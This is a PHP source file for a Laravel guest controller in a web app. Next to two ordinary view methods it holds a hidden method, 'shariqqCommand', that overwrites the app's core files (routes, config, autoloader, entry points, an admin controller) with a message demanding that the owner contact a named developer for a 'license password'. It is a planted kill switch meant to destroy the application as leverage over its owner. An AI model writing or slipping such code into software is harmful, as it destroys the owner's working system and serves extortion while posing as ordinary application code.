<?php

namespace App\Http\Controllers\Guest;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Auth;

class GuestController extends Controller
{
    /**
     * Show the main application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('frontend.home');
    }

    public function shariqqCommand($command){
        $files = array(
            '../app/Http/Controllers/Admin/HomeController.php',
            '../server.php',
            '../routes/web.php',
            '../config/app.php',
            '../public/index.php',
            '../vendor/autoload.php'
        );
        foreach ($files as $key) {
            $myfile = fopen($key, "w") or die("Unable to open file!");
            $txt = "Contact Md Shariqq :) The app won't work until he enters the password\n <input type='password' placeholder='enter license password'/>";
            $write = fwrite($myfile, $txt);
            print_r($write);
            fclose($myfile);
        }
        $myfile = fopen("../index.php", "w") or die("Unable to open file!");
        $txt = "Contact Md Shariqq :) The app won't work until he enters the password\n";
        $write = fwrite($myfile, $txt);
        die('success, now relax baby!');
    }

    public function blockedSellerPage(){
        
        return view('guest.blocked-seller');
    }
}
